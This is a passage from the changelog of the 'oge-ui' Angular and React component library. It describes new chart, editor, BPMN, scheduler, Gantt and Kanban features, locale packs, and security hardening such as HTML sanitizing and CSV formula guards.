- **Mention** (`oge-mention` / `<OgeMention>`): a text area (or single-line
  combobox) with one or more triggers (`@`, `#`, …), static, function or
  async suggestion sources, a caret-anchored popup on `OgeAnchoredPanel` /
  `useAnchoredPanel` (`ogeCaretRect`), item templates, plain-text tokens and a
  `mentions` model that tracks edits by text diff. Core: `mention-core.ts`.
- **Tokens**: `--oge-rating-color`, `--oge-rating-empty-color`,
  `--oge-signature-ink`, `--oge-signature-bg` (derived, in every theme).

### Chart components (W8c) — `@oge-ui/charts`, `@oge-ui/react-charts`, `@oge-ui/charts-engine`, `@oge-ui/locales`

- **Gauges**: `oge-circular-gauge` / `<OgeCircularGauge>` (arc from
  `startAngle` to `endAngle` in degrees, needle / bar / marker `indicator`,
  `barBase`, `subvalues`, value text) and `oge-linear-gauge` /
  `<OgeLinearGauge>` (horizontal or vertical, bar or marker, mirrored in RTL).
  Both share `scale` (1-2-5 major and minor ticks, `labelFormat`), coloured
  `ranges` whose `label` is spoken with the value, and `role="meter"`
  semantics (`aria-valuenow` clamped, `aria-valuetext` with the range). The
  indicator sweeps in from the minimum and transitions on change through CSS
  (`transform` / `stroke-dasharray` over a fixed `pathLength`) — off under
  `prefers-reduced-motion`.
- **Bullet chart**: `oge-bullet-chart` / `<OgeBulletChart>` — qualitative bands
  (default shades darkest = poor), value bar and target marker, horizontal or
  vertical, RTL, a hover tooltip and an accessible name speaking value and
  target.
- **Sparkline**: `oge-sparkline` / `<OgeSparkline>` — `line`, `area`, `bar`,
  `winloss`, first / last / min / max `markers`, an optional tooltip and a
  summary label. Its own entry points, `@oge-ui/charts/sparkline` and
  `@oge-ui/react-charts/sparkline`, never load the cartesian chart (the
  Angular config moved to `@oge-ui/charts/config` for that; the primary entry
  re-exports everything unchanged).
- **Funnel / pyramid**: `oge-funnel-chart` / `<OgeFunnelChart>` —
  `dynamicSlope` or `dynamicHeight`, neck, inverted, inside or outside
  labels with connectors, conversion rates (share of first / previous stage)
  in the tooltip, announcements and sr table, legend, selection, keyboard.
- **Heatmap**: `oge-heatmap` / `<OgeHeatmap>` — category × category cells
  through `OgeChartColorScale` (linear stops blended with `color-mix()`, theme
  tokens included, or segmented bands), a colour-scale legend, APG-grid
  keyboard navigation and a two-dimensional sr table.
- **Treemap and sunburst**: `oge-treemap` / `<OgeTreemap>` (squarified or
  slice-and-dice, group headers, fitted labels, palette or value colours) and
  `oge-sunburst-chart` / `<OgeSunburstChart>` (one ring per level) on one
  hierarchy model — nested or flat (`idField` + `parentField`) data,
  drill-down with a breadcrumb, `[(rootKey)]` / `rootKey`, `drillTo()` /
  `drillUp()`, treeview-like keys.
- **Sankey**: `oge-sankey-chart` / `<OgeSankeyChart>` — longest-path columns,
  throughput heights, relaxed positions, cycles tolerated, links coloured by
  source / target / neutral, hover highlighting, column keyboard navigation,
  RTL.
- **Vector map**: `oge-vector-map` / `<OgeVectorMap>` — GeoJSON polygons,
  Mercator or equirectangular projection, choropleth by key, labels, wheel /
  pinch / button / keyboard zoom and drag pan on the shared gesture machine,
  spatial arrow-key region navigation.
- **Engine**: the models, layouts (`squarify`, `layoutSankey`, `layoutFunnel`,
  gauge geometry), colour scales, hierarchy, keyboard maps and the new
  `visuals` message block (`OgeChartsVisualMessages`, ICU plurals) are all
  framework-free in `@oge-ui/charts-engine`. The image / PDF exporters now
  resolve token colours set inline (`var()` / `color-mix()`) to their computed
  values.
- **Tokens**: `--oge-chart-heat-low` / `--oge-chart-heat-high` (literal, with
  dark and high-contrast values) and the derived `--oge-chart-track`,
  `--oge-chart-needle`, `--oge-chart-empty`, `--oge-chart-link`.
- **Locales**: the `charts.visuals` block in all ten packs.
- **Docs**: two new pages, `/components/charts/gauges` and
  `/components/charts/specialized`, in both layers, plus ten API blocks per
  layer.

### Rich-text editor (W8e) — `@oge-ui/editor`, `@oge-ui/react-editor` (new, MIT), `@oge-ui/behavior`, `@oge-ui/locales`, `oge-ui`, `@oge-ui/react`

Two new packages: `<oge-editor>` and `<OgeEditor>`, both thin render layers
over one editor machine in `@oge-ui/behavior` (`OgeEditorCore`).

- **Licence tier: MIT.** ADR 0003 and the open-core rule reserve the
  commercial tier for the heavy analytical products (pivot, scheduler, Gantt,
  Kanban, BPMN, charts); a rich-text editor is a form editor that every
  reference suite's free tier competes on (PrimeNG ships one), so it joins the
  MIT families — its engine lives in MIT `behavior`, it is part of the `oge-ui`
  and `@oge-ui/react` umbrellas, and `provideOgeLocale()` /
  `<OgeLocaleProvider>` cover it.
- **No `document.execCommand`.** The document is an immutable model (a flat
  list of blocks holding inline runs with marks); every keystroke, toolbar
  click and paste is a pure command on it, and the `contenteditable` DOM is
  re-rendered from the model (unchanged blocks keep their elements, so
  spell-check and IME sessions survive). IME compositions, the one edit a
  browser cannot be stopped from making, are read back from the DOM when they
  end; any `input` no handler intercepted triggers a full read-back.
- **Formatting:** bold, italic, underline, strikethrough, inline code,
  sub/superscript, text and highlight colours (the inputs colour palette),
  paragraph / headings / quote / code block, bulleted and numbered lists with
  nesting (Tab / Shift+Tab), links, images by URL, horizontal rules,
  alignment (logical start / center / end / justify), per-block `dir`, clear
  formatting — and the editor's own undo/redo history, typing coalesced into
  words.
- **Keyboard:** Ctrl/⌘ + B / I / U / K / Z / Y (and Shift+Z), Shift+X strike,
  E inline code, Alt+0…6 block formats, Shift+7 / 8 / 9 lists and quote,
  Shift+L / E / R / J alignment, `\` clear formatting, Shift+Enter line break;
  digits are read by physical key so the shortcuts work on every layout.
  Markdown shortcuts (`# `…`###### `, `- `, `1. `, `> `, ` ``` `,
  `---` + Enter); one undo restores the typed marker.
- **Toolbar:** the layout package's APG toolbar (roving focus, overflow menu
  that keeps toggle check marks), tooltips and `aria-keyshortcuts` with the
  platform's shortcut spelling, `aria-pressed` toggles, a block-format radio
  menu, colour popups and link / image dialogs on the overlay's `prompt()`.
  Configurable entries: built-in tool names, separators and
  `OgeEditorCustomTool` objects.
- **Sanitized HTML in and out.** One allowlist parser reads the bound value,
  pastes and `insertHtml()`: allow-listed tags and styles become model data,
  everything else is unwrapped or dropped with its content; links go through
  `sanitizeUrl`, images through `sanitizeResourceUrl` (`blob:` / `file:` and
  SVG never, `data:image/*` only with `allowDataImages`), colours are
  validated, `target` is only `_blank` and always gets `rel="noopener
noreferrer"`. The value is re-serialized from the model, which defeats
  mutation XSS. Word (list paragraphs, `mso-list:Ignore` markers, Office
  namespace tags, local images) and Google Docs (the `font-weight:normal`
  wrapper, styled spans) pastes are cleaned up; default black / white colours
  are dropped from pastes so dark themes keep working.
  `ogeSanitizeEditorHtml()` exposes the same allowlist.
- **Trusted Types and CSP:** the one `DOMParser` call runs behind the new
  `oge-ui#editor` policy; the live DOM is built with `createElement` and
  styles go through the CSSOM — no `innerHTML`, no
  `dangerouslySetInnerHTML`.
- **Forms:** standalone `[(value)]`, reactive forms (ControlValueAccessor,
  with `ogeEditorMaxLength()` counting text rather than markup) and Signal
  Forms (`FormValueControl`); React is controlled or uncontrolled with a ref
  handle (`exec`, `insertHtml`, `insertLink`, `undo`, `reset`, …).
  `maxLength` stops typing and pasting at the limit, `counter` shows
  characters and / or words (ICU plurals).
- **Accessibility:** `role="textbox"` + `aria-multiline`, label / hint /
  error / counter wired through `aria-labelledby` / `aria-describedby`,
  formatting toggles announced politely, forced-colours and reduced-motion
  blocks, RTL-mirrored directional icons, 16px text on coarse pointers,
  read-only (focusable) and disabled modes, placeholder, min / max height
  and a vertical resize handle.
- New tokens: `--oge-editor-bg`, `--oge-editor-toolbar-bg`,
  `--oge-editor-link`, `--oge-editor-code-bg`, `--oge-editor-quote-border`
  (derived, in every theme).
- `OgeEditorMessages` is translated in all ten locale packs (`editor` slice).

### BPMN editor depth (G5b) — `@oge-ui/bpmn`, `@oge-ui/react-bpmn`, `@oge-ui/bpmn-engine`, `@oge-ui/locales`

- **Validation**: a bpmnlint-style rule engine in the engine (`OgeBpmnLintRule
{ id, severity, check(model, context) }`, `OGE_BPMN_DEFAULT_LINT_RULES`:
  start / end events, disconnected and unreachable nodes, superfluous gateways,
  exclusive-gateway conditions and default flows, implicit splits and joins,
  labels, duplicate ids, sub-process start events, message flows between pools,
  attached boundary events), `lintBpmnDiagram()` for headless checks. Editor:
  `lint` (live badges whose text joins the element's accessible name, a header
  problems toggle and a problems panel — click / Enter selects and centers),
  `lintRules` (add / replace / re-grade / `'off'`), `validate()` and
  `lintChanged` / `onLintChanged`.
- **Extensibility**: `propertiesProviders` (groups of `text` / `textarea` /
  `select` / `checkbox` / `expression` / `list` / `custom` entries whose
  `set(value)` returns an undoable command; custom entries through
  `ng-template[ogeBpmnPropertiesEntry]` / `renderPropertiesEntry`),
  `paletteProvider` and `contextPadProvider` (icon, label, hotkey, action over
  an `OgeBpmnEditorApi`), `renderers` per node type built with the safe
  `bpmnSvg` builders (sanitized, no markup path; applied to the SVG / PNG
  export too) and Camunda-style element templates
  (`bpmnElementTemplatesProvider`, `applyElementTemplateCommand`).
- **Camunda / Zeebe**: `<bpmn:extensionElements>` is read into an editable
  `BpmnXmlElement` tree and written back deterministically; the opt-in
  `OGE_BPMN_CAMUNDA_PROVIDERS` preset edits `zeebe:taskDefinition`,
  `zeebe:ioMapping`, `zeebe:taskHeaders`, `camunda:assignee` /
  `candidateGroups` / `formKey` and `camunda:inputOutput`, declaring
  `xmlns:zeebe` / `xmlns:camunda` when needed; typed helpers
  (`bpmnZeebeTaskDefinition`, `setZeebeIoMappingCommand`, …) for scripts.
- **Event definitions keep their payloads**: timer date / duration / cycle,
  message / signal / error / escalation references with the definitions-level
  root elements (`BpmnDiagram.rootElements`, "New message" in the panel),
  conditional conditions and link names — imported, editable and exported.
- **Modeling**: a documentation field on every element and the process;
  drag re-parenting into and out of pools, lanes and expanded sub-processes
  (target highlight, one undo step) with the keyboard "Move to…" select as its
  twin (`moveToContainerCommand`); `exportPng()` rasterizes the SVG export.
- **New message keys** (optional blocks `lint`, `extensions`, `camunda`,
  filled from English by `fillBpmnMessages`, translated in all ten locale packs).
- **Behaviour changes**: `<bpmn:documentation>` and attribute-less
  `<bpmn:extensionElements>` are no longer kept in `foreignChildren` — they are
  the `documentation` / `extensionElements` fields; definitions-level
  messages, signals, errors and escalations moved from
  `foreignDefinitionsChildren` to `rootElements`; an imported event-definition
  id is kept instead of being rewritten to `{eventId}_def`; process-level
  documentation and extension elements of the default process are imported
  instead of being dropped with a warning; a node placed inside an expanded
  sub-process becomes its child.

### Time zones and remote range loading (W7) — `@oge-ui/core`, `@oge-ui/scheduler`, `@oge-ui/react-scheduler`, `@oge-ui/scheduler-engine`, `@oge-ui/gantt`, `@oge-ui/react-gantt`, `@oge-ui/gantt-engine`

- **Zoned date math in core**: `ogeTzOffset`, `ogeZonedParts`, `ogeFromZoned`
  (`compatible` / `earlier` / `later` for skipped and repeated wall times),
  `ogeToWallClock` / `ogeFromWallClock` / `ogeConvertWallClock`,
  `ogeZonedStartOfDay`, `ogeZonedDayMinutes`, `ogeTimeZones`, `ogeTimeZoneLabel` —
  `Intl.DateTimeFormat` offsets only, no time-zone database.
- **Scheduler time zones**: `timeZone` (IANA) for display — slots, day boundaries
  (23- and 25-hour DST days), the now-line, drag / resize snapping and recurrence
  follow the zone's clocks while stored dates stay instants;
  `startTimeZoneExpr` / `endTimeZoneExpr` per appointment (a series recurs on its
  own zone's clocks); `showTimeZoneEditor` adds start / end zone pickers to the
  editor; RRULE blocks honour `DTSTART;TZID=` / `RDATE;TZID=` / `EXDATE;TZID=`;
  the iCalendar export writes `TZID=` values and the import reads them.
- **Scheduler remote data**: `dataSource` accepts an `OgeSchedulerDataSource`
  whose `load({ startDate, endDate, resources, signal })` runs per visible range,
  with the neighbouring periods prefetched, navigation debounced, stale ranges
  aborted, a range cache, a loading status line (`aria-busy`) and `reload()`;
  CRUD goes through its `insert` / `update` / `remove`. `remoteFiltering` gives a
  filtering core `DataSource` the same per-range loading.
- **Gantt time zones**: `timeZone` for the bars, the scale, today, the progress
  line, strip lines and the work calendar's working days.
- **New message keys** (optional, filled from English, translated in all ten locale
  packs): editor `startTimeZoneLabel`, `endTimeZoneLabel`, `timeZonePlaceholder`;
  grid `loadingLabel`, `loadErrorLabel`.
- **Behaviour changes**: an RRULE block with `TZID=` used to be rejected — it is now
  expanded in that zone (an unknown zone name is still rejected); iCalendar `TZID`
  values used to be read as local wall time and are now converted from their zone,
  and imported events keep the zone in `startTimeZone` / `endTimeZone`;
  `rangeSelected`, `cellClick` and `getStartViewDate()` carry instants (identical to
  1.x without a `timeZone`).

### Overlay, navigation, layout and buttons depth (G5a) — `@oge-ui/overlay`, `@oge-ui/navigation`, `@oge-ui/layout`, `@oge-ui/buttons`, `@oge-ui/behavior` and their React twins

- **Popover**: `oge-popover` + `[ogePopover]` / `<OgePopover>`. It has a title, footer
  actions, a close button and a callout arrow. Triggers are click, hover (with a grace period
  into the panel), focus and manual. A `modal` popover traps focus; a non-modal one follows
  the APG disclosure, and Tab leaves it as if it were inline. Cancelable `opening` /
  `closing` carry reasons; open state is two-way `[(visible)]` (React: `open` /
  `defaultOpen` / `onOpenChange`); `open()` / `close()` / `toggle()`.
- **Tooltip**: template or render-prop content (`ogeTooltip` accepts a `TemplateRef` plus
  `tooltipContext`; React `content`), a callout arrow (`tooltipArrow` / `arrow`), `showMode`
  `'hover' | 'focus' | 'click' | 'manual'`, `maxWidth`, and imperative `open()` /
  `close()` / `toggle()` (`exportAs: 'ogeTooltip'`, React ref handle).
- **Context menu**: CSS-selector target delegation (`contextMenuTarget` / `target`), a
  cancelable `opening` event that carries the target element and may rebuild `items` per
  target, and imperative `open(x, y)` / `open(event)` (`exportAs: 'ogeContextMenu'`, React
  handle).
- Behavior: `OgePopoverCore`, `resolvePopupArrow` (also the anchored panel's `arrow`
  option), tooltip show modes, the context-menu open pipeline, and the
  `popoverShowDelayMs` / `popoverHideDelayMs` timings.
- **Dialog helpers**: `confirm()` / `alert()` / `prompt()` on `OgeModalService` and on
  React `useOgeModals()`. They return promises (`boolean` / `void` / `string | null`) and
  render as APG alert dialogs with severity icons, localized OK / Cancel, a `danger`
  style whose initial focus is on Cancel, Enter = OK and Escape = Cancel, and sync or
  async prompt validation (`aria-invalid` / `aria-describedby`). The modal also gains
  `dialogRole` and `ariaDescribedBy`.
- **Non-modal window**: `oge-window` / `<OgeWindow>`. Several windows can be open at
  once. A shared z-order brings the pressed or focused window to the front. It drags by
  the title bar and resizes from 8 handles, with a keyboard twin (arrows move,
  Ctrl+arrows resize, Shift for 1px steps). It has minimize / maximize / restore with
  a cancelable `stateChanging`, `keepInViewport`, `position`, nine placements, and the
  `moved` / `resized` / `activated` events.
- **Modal placements**: `placement` gains `bottom`, `start`, `end` and the four corners
  (`top-start` … `bottom-end`), all logical and RTL-aware.
- **Load panel**: `oge-load-panel` / `<OgeLoadPanel>` (`@oge-ui/layout/load-panel`).
  It is a shading overlay over its parent, a `target` or the full screen, with a
  message and indicator, `showDelay` and `minDisplayTime`. The target gets a
  ref-counted `aria-busy`, and the message is announced through the shared live
  announcer. `@oge-ui/react-layout` now peers on `react-dom`.
- **Circular progress**: `type="circular"` on `oge-progress-bar` / `<OgeProgressBar>`.
  It is an SVG ring with `size` and `thickness`, a centred label and an indeterminate
  spin.
- **Panel bar**: `oge-panel-bar` / `<OgePanelBar>` (`@oge-ui/layout/panel-bar`). It
  takes nested groups and content items, `expandMode` `'single' | 'multiple' | 'full'`,
  and `[(selectedKey)]` / `[(expandedKeys)]`. It follows the APG disclosure pattern,
  with arrow-key navigation as an extra.
- **Expansion panel**: `oge-expansion-panel` / `<OgeExpansionPanel>`
  (`@oge-ui/layout/expansion-panel`). A single APG disclosure with `[(expanded)]`,
  cancelable `expanding` / `collapsing`, `expandGuard`, header actions and lazy
  content.
- **Toggle button**: `oge-button` / `<OgeButton>` gain `toggle` with a two-way
  `selected` (React: `selected` / `defaultSelected` / `onSelectedChange`). It renders
  `aria-pressed`, fires `selectedChanged { selected, previousValue, event }`, and
  pressed and unpressed toggles are styled in every styling mode, forced colours
  included.
- **Menu rows**: `OgeMenuItem` gains `type: 'checkbox' | 'radio' | 'header'`, `group` and
  `keepOpen`. Rows render as `menuitemcheckbox` / `menuitemradio` with `aria-checked`.
  Header rows label a `role="group"` and are skipped by the keyboard. Space toggles
  without closing (APG). Item-click events report the next `checked` state, and
  `applyMenuItemCheck()` applies it. Rows that set only `checked` are unchanged.
- **Menubar "More" overflow**: `overflowMode: 'hamburger' | 'more' | 'none'`. In
  `'more'` mode, top-level items that do not fit collapse into a trailing More item
  (`messages.more`; per item `overflow: 'auto' | 'always' | 'never'`) instead of the
  all-or-nothing hamburger.
- **Tree view**:
  - Drag & drop between trees that share a `dragGroup` (`itemTransferred`;
    `itemReordering` / `itemReordered` gain `sourceTreeId`, `targetTreeId` and
    `trigger`), with a Ctrl+X / Ctrl+V keyboard twin, `cutItem()` / `pasteItem()` and
    live announcements. Node drags now run on the shared pointer machine (touch long
    press, ghost, auto-scroll).
  - In-place label editing: `allowEditing`, `editOnDblClick`, `validateEdit`,
    `itemEditStarting` / `itemEditing` / `itemEdited`, `editItem()` / `cancelEdit()`.
  - "Load more" paging: `childPageSize`, `childPageShown`, `showMoreChildren()`.
- **Drawer**: built-in navigation `items` with `[(selectedKey)]`, `itemClick`,
  `selectionChanged` and `[ogeDrawerItemTemplate]` / `renderItem`, and mini-rail icons
  with tooltips. `swipeEnabled` adds a touch swipe that opens and closes the drawer
  (new close reason `'swipe'`).
- Behavior: `beginPointerGesture` gains a `touchLock` option. New token
  `--oge-z-window`.
- New message keys, translated in all ten `@oge-ui/locales` packs:
  - overlay: `popoverClose`, `dialog*`, `window*`
  - layout: `loadIndicator.loadPanelMessage`
  - navigation: `menubar.more`, and `treeView.loadMore` / `edit*` / `*Announcement`

### Gantt scheduling depth (G3b) — `@oge-ui/gantt`, `@oge-ui/react-gantt`, `@oge-ui/gantt-engine`

- **Lag / lead** on every link type (`dependencyLagExpr` / `dependencyLagUnitExpr`,
  working days on a calendar or hours): a `+2d` badge on the arrow, a dependency
  editor (double-click an arrow, or Enter on a clicked one), `updateDependency()`
  with cancelable `dependencyUpdating` / `dependencyUpdated`.
- **Constraints, deadlines, manual mode**: `constraintTypeExpr` / `constraintDateExpr`
  (ASAP, ALAP, SNET, SNLT, FNET, FNLT, MSO, MFO), `deadlineExpr` (marker + overdue),
  `manuallyScheduledExpr`; violations are drawn and reported through
  `schedulingConflict`.
- **A real scheduling engine** (`scheduleGanttProject`): forward pass that pulls tasks
  earlier as well as pushing them later, ALAP backward pass, `projectStart`,
  `scheduleProject()`; `getTaskSlack()` plus `totalSlack` / `freeSlack` columns.
- **Task list**: `inlineEditing` (F2 / double-click; text, date, number, duration and
  predecessor `3FS+2d` editors), `allowSorting`, `filterRow`, `searchPanel`,
  `allowColumnResizing` / `allowColumnReordering` (pointer + Alt / Ctrl+Shift+Arrow),
  `frozen` columns, `selectionMode: 'multiple'` with `[(selectedTaskKeys)]` and bulk
  `deleteTasks` / `indentTasks` / `outdentTasks` (one undo step each).
- **Scales & tracking**: `quarters` and `years` scales, `zoomPresets` chooser, `wbs`
  column, split tasks (`segmentsExpr`), several baselines (`baselinesExpr`,
  `[(baselineIndex)]`, `setBaseline(i)`), progress line (`showProgressLine`,
  `statusDate`), child-milestone roll-ups (`showRollups`).
- **Resources**: assignment `unitsExpr`, `effortExpr` + `effortDriven` / `hoursPerDay`,
  `showResourceHistogram` (capacity line, over-allocation), `[(viewMode)]` resource view.
- **MS Project XML**: new lazy entry `/export-msproject` in all three packages
  (`exportGanttToMsProject`, `importMsProjectXml`), dependency-free.
- **Behaviour changes**: with `autoScheduling` on, successors now move _earlier_ when
  their predecessors allow it (1.x only pushed later; `autoScheduleForward` keeps that
  behaviour for direct callers); the zoom ladder ends at `years` instead of `months`;
  the toolbar gains a scale chooser (and a resource-view toggle when `resources` exist);
  `OgeGanttSelectionChangedEvent` gains `tasks`; the task dialog adds units with
  resources and the scheduling fields with `autoScheduling`; `OgeGanttTask` /
  `OgeGanttDependency` carry the new fields. New message keys are optional and fall
  back to English.

### Kanban depth (G3b) — `@oge-ui/kanban`, `@oge-ui/react-kanban`, `@oge-ui/kanban-engine`

- **Filtering**: a programmatic `filter` (a card predicate or an
  `OgeKanbanFilterExpression` — tags, assignees, priorities, columns,
  swimlanes, text, overdue) and an opt-in chip bar (`showFilterBar`, two-way
  `filterValue`) for tags, assignees and priorities, ANDed with the toolbar
  search. WIP counts stay unfiltered.
- **Per-column sort**: two-way `columnSort` (`{ field: 'order' | 'title' |
'priority' | 'dueDate', direction }` or a comparator, `'*'` for every column)
  and `priorityOrder`; a new header button opens the column menu with sort
  entries (`menuitemradio`) and "Select all in column".
- **Multi-select** (`selectionMode: 'multiple'`, the default; two-way
  `selectedCardKeys`): Ctrl/Shift-click, Ctrl+A in a column, Ctrl+Space,
  Shift+↑/↓, Escape. A drag of a selected card carries the selection (the
  ghost shows an ICU-plural count); Ctrl+←/→ and Delete act on it;
  `moveCards()`, `deleteCards()`, `selectCards()`, `clearSelection()`.
- **Cross-board drag**: boards sharing a `dragGroup` exchange cards by drag
  or the card menu's "Move to {board}" entry; `boardId`, cancelable
  `cardTransferring` on the target, `cardTransferred` on both boards,
  `transferCards()`.
- **Swimlane WIP limits**: `OgeKanbanColumn.swimlaneWipLimit` (per cell badge)
  and `swimlaneWipLimits` (per-lane totals on the lane header).
- **Quick add + inline titles**: `quickAdd` turns the column footer into an
  inline composer; F2 (and a title double-click with `inlineTitleEditing`)
  renames a card in place; `startTitleEdit()`.
- **Checklists**: `checklistExpr` (`{ text, done }` items) with a progress
  badge and `toggleChecklistItem()`.
- **Undo/redo**: `undoLimit` (default 50), Ctrl+Z / Ctrl+Y and toolbar
  buttons, `undo()` / `redo()` / `canUndo()` / `canRedo()` — replayed through
  the cancelable pipelines.
- **Export**: `getExportData()` / `exportToCsv()` (formula-guarded) and new
  lazy `/export-excel` entries in both layers over
  `@oge-ui/kanban-engine/export-excel` (optional `exceljs` peer).
- Behaviour changes: the toolbar shows Undo / Redo buttons while
  `undoLimit > 0`; Ctrl/Shift-click no longer just re-selects one card; the
  column header gains a column-menu button; the empty-result heading reads
  "No cards match the filters" when filters (not the search) empty the board.
  New message keys are optional (`fillKanbanMessages()` fills English).
- Docs: "Filtering & sorting" and "Multi-select & cross-board" pages in both
  layers.

### Ready-made translations — `@oge-ui/locales` (new, MIT)

- **Ten languages for every catalog**: German, French, Spanish, Italian,
  Brazilian Portuguese, Turkish, Japanese, Simplified Chinese, Arabic and
  Hebrew — all 813 strings of the MIT families _and_ the commercial ones
  (pivot, scheduler, Gantt, Kanban, BPMN, charts). The count-bearing keys
  are ICU plurals with each language's CLDR forms (Arabic
  `zero one two few many other`, Hebrew `one two other`, Turkish / Japanese
  / Chinese `other` only).
- **One entry point per language** (`import { tr } from '@oge-ui/locales/tr'`),
  each a typed `OgeLocalePack` (`locale`, `dir`, one deep-partial slice per
  catalog). The primary entry carries only the types, `ogeMergeMessages`,
  `OGE_LOCALE_NAMES`, the `en` baseline and `ogeLocalePacks` — lazy
  `import()` loaders for runtime switching.
- **Wiring**: `provideOgeLocale(pack | () => pack)` in `oge-ui` and
  `<OgeLocaleProvider pack>` in `@oge-ui/react` configure every MIT family
  (strings, plus `locale` for the grid / tree list and the editors).
  Commercial families take their slice through their own provider with
  `ogeMergeMessages(OGE_DEFAULT_<X>_MESSAGES, pack.<x>)` — the MIT umbrellas
  still never depend on them.
- **No runtime dependencies**: the catalog types come from `@oge-ui/behavior`
  and the engines through `import type` only (optional peers, erased by the
  build).
- **CI gate** `docs-tools:locales-check` (part of `docs-tools:lint`): fails on
  unknown keys, placeholder mismatches and malformed or wrong-category
  plurals; prints a coverage table and only warns on keys a pack does not
  carry yet (they stay English).
- Docs: a "Ready-made translations" section with a live language switcher
  (grid, date box, select box; both layers) on the localization page, and a
  new Localization API page.
- `@oge-ui/react` now treats `@oge-ui/react-upload` as external like every
  other family instead of bundling a second copy of it.

### Scheduler depth (G3a) — `@oge-ui/scheduler`, `@oge-ui/react-scheduler`, `@oge-ui/scheduler-engine`

- **Views:** `timelineWorkWeek`, `timelineMonth` and `timelineYear` (day
  scale); `intervalCount` on view options for N-day / N-week / N-month and
  scaled timeline views; `showWeekNumbers` with `weekNumberRule: 'iso' |
'locale'`.
- **Grouping:** every `groups` level is honoured (nested headers, drags
  reassign all levels); `groupOrientation` (`'vertical'` = day/week row
  blocks) and `groupByDate`; resource header template
  (`ogeResourceHeaderTemplate` / `renderResourceHeader`).
- **Availability and editing:** `disabledSlots` (predicate or ranges with
  RRULE and resource scope — hatched, refused, announced); per-resource
  `workHours` / `workDays` and `snapToWorkHours`; `allowOverlap` +
  `conflictCheck`; multi-select (`selectedAppointments`), Ctrl+C / Ctrl+V
  copy and paste, Ctrl+Z / Ctrl+Y undo and redo (`undoLimit`, `undo()`,
  `redo()`, `canUndo()`, `canRedo()`).
- **Drag in and out:** `[ogeSchedulerDraggable]` / `useOgeSchedulerDraggable`
  make any element an appointment source (pointer, touch and a keyboard
  twin), with `appointmentDropped` and `dragOut` events and drops between
  schedulers.
- **Recurrence editor:** nth / last weekday (BYSETPOS), several days of the
  month, yearly month + day or weekday, count / until, skipped occurrences,
  and a live ICU summary; rules the form cannot express are kept verbatim.
- **"+N more" popup:** `moreMode: 'popup' | 'drill'` — the default is now a
  keyboard-accessible day list with a "Go to day" action.
- **Import / export:** lazy `/export-ical` (RFC 5545 export and import, no
  dependencies), `/export-pdf` (jspdf peer, `setOgePdfDefaultFont`) and
  `/export-excel` (exceljs peer) entries, `getExportData()` and `print()`.
- **Timeline row virtualization** (`virtualScrolling`, auto above 50 rows).
- New message keys (week numbers, the recurrence editor and summary, the
  "+N more" popup, availability and clipboard announcements, export headers)
  are optional — catalogs without them fall back to English.
- **Behaviour change:** the month view's "+N more" opens the day list instead
  of drilling into the day view; set `moreMode="drill"` for the 1.1 behaviour.
- Docs: new Scheduler pages "Views & grouping", "Resources & availability",
  "Recurrence editor" and "Import / export".

## 1.1.2 — 2026-10-04

Everything below is on `main` and ships together as **1.1.2**. It is the
first half of the plan that closes the gaps found by four post-1.1.1 audits
and the [competitive gap reports](docs/competitive-gaps/README.md): a green,
hardened CI; security and locale fixes; accessibility, touch and mobile
support across every family; the grid, inputs and charts depth waves (G1, G4,
G2); and locale formatting, plural messages and right-to-left support (W4).
Every addition lands in the Angular and the React layer together. Charts
depth (G2), scheduling depth (G3), overlay/BPMN depth (G5), locale packs,
time zones, new components and AI helpers follow — see
[`ROADMAP.md`](ROADMAP.md#120-plan-and-what-comes-next). Read **Migration
notes / behaviour changes** at the end before upgrading.

### CI, security and project

- **Green CI on Angular 22.2 / Nx 23.2.1 / Vitest 4.1.11** with zero
  `npm audit` findings: targeted `overrides` for the vulnerable pins inside
  the tooling, and `node tools/audit-check.mjs` as the audit gate — it fails
  on any advisory at moderate or above unless `audit-allowlist.json` lists it
  with a reason and an expiry date (only for advisories with no patched
  release; two build-tooling entries, expiring 2026-10-31).
- CI is split into verify (`nx affected`), sharded e2e (3 shards, HTML +
  JUnit report artifacts, `--fail-on-flaky-tests`) and audit jobs; every
  third-party action is pinned to a commit SHA, runners use
  `harden-runner`, and OpenSSF Scorecard and CodeQL run on the repository.
- A control-character guard (`tools/docs-tools/check-control-chars.mjs`,
  part of `docs-tools:lint`) rejects raw C0 control bytes in sources, and a
  lint rule flags literal English `aria-label` values in library templates
  and TSX.
- `SECURITY.md` gains a support table (1.x supported; 0.13.x security fixes
  until 2027-04-01) and a response timeline (GHSA, CVSS 4.0, fix targets);
  new `PRIVACY.md` for the docs site.
- Angular peer ranges widen to `>=22.0.0 <24.0.0` to match the documented
  22–23 support; the README has a compatibility matrix (OGE × Angular ×
  React × Node) and the browser list.
- Docs site: **www.ogeui.com** is the canonical host (canonical, `og:url`,
  sitemap, robots, `llms` links and package homepages); legacy grid paths
  answer with a host 301; a version menu links the archived 0.13 docs; npm
  download stats come from a build-time `/npm-downloads.json`; the initial
  bundle drops from 1.29 MB to 861 kB (budget error now 1 MB).

### Security and correctness hardening

- **CSV formula guard** (`guardCsvFormula`, every CSV and clipboard TSV
  export) checks the first _non-whitespace_ character and the full-width
  leads `＝ ＋ － ＠`; the tree list guards the first-column value before
  indenting it.
- **State snapshots are validated** on every restore —
  `sanitizeGridStateSnapshot`, `sanitizeTreeListStateSnapshot`,
  `sanitizePivotGridStateSnapshot` and `parseStateJson` in `@oge-ui/core`
  drop unknown keys, reject `__proto__` / `constructor` / `prototype` at any
  depth and type-check every value; `stateKey` persistence and every
  `applyState()` in both layers use them.
- **`sanitizeUrl` is a scheme allowlist** (relative, `http(s)`, `mailto`,
  `tel`, `ftp`, `sms`) with an `allowedSchemes` option; script schemes can
  never be allowed, `blob:` / `data:` stay behind `allowObjectUrls`.
- **BPMN**: overlay links that keep `target` get `rel="noopener noreferrer"`,
  `role` is dropped, and XML / overlay parsing goes through a
  lazily created Trusted Types policy **`oge-ui#bpmn`**.
- **SSR-safe React ids**: tabs, drawer, stepper and the file uploader derive
  their ARIA ids from `useId()` instead of `performance.now()` / module
  counters, so hydration no longer mismatches.
- **Unicode PDF fonts**: `OgePdfFont` and `setOgePdfDefaultFont()` in
  `@oge-ui/behavior` embed a TrueType font into every grid, tree-list, pivot
  and Gantt PDF export (Turkish `ğ ş ı İ`, Polish, Greek, Cyrillic …), with a
  one-time warning when such text is exported without one.
- Excel export writes `datetime` columns as typed dates with a
  `dateTimeFormat` (default `yyyy-mm-dd hh:mm`).

### Localization

- Grid and tree-list accessible names that were hard-coded English move into
  `OgeGridMessages` (`reorderColumnHeader`, `detailColumnHeader`,
